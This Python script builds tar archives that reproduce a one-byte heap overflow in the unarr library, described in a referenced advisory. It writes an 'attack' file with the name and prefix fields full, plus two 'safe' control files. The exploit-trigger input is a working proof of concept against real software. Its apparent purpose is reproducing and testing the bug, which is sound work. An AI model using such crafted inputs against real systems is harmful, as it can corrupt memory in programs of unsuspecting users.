#!/usr/bin/env python3
"""Build USTAR headers that fill name (100 non-NUL) and prefix (156 non-NUL).

The advisory's deterministic one-byte heap overflow needs both fields full:
name[100]='\\0' and prefixed[156]='\\0' are set by unarr itself, so the two
strcat calls require 156+1+100+1 = 258 bytes from a 257-byte allocation.
"safe" variants leave one field short so the concatenation fits.
"""
import sys


def octal_field(value, width):
    return ("%0*o" % (width - 1, value)).encode() + b"\0"


def header(name_len, prefix_len, name_byte=b"A", prefix_byte=b"B"):
    data = bytearray(512)
    data[0:name_len] = name_byte * name_len
    data[124:136] = octal_field(0, 12)   # size
    data[136:148] = octal_field(0, 12)   # mtime
    data[148:156] = b" " * 8             # checksum placeholder
    data[156:157] = b"0"                 # typeflag: regular file
    data[257:265] = b"ustar\x0000"       # USTAR magic + version
    data[345:345 + prefix_len] = prefix_byte * prefix_len
    data[501:512] = b"\0" * 11
    checksum = sum(data)
    data[148:156] = octal_field(checksum, 8)
    return bytes(data) + b"\0" * 1024    # entry + end-of-archive marker


def main():
    out_dir = sys.argv[1]
    variants = {
        "attack": (100, 156),   # 258 bytes required, 257 allocated -> 1-byte OOB NUL
        "safe-short-name": (99, 156),
        "safe-short-prefix": (100, 155),
    }
    for label, (nl, pl) in variants.items():
        path = "%s/%s.tar" % (out_dir, label)
        with open(path, "wb") as f:
            f.write(header(nl, pl))
        print(path)


if __name__ == "__main__":
    main()
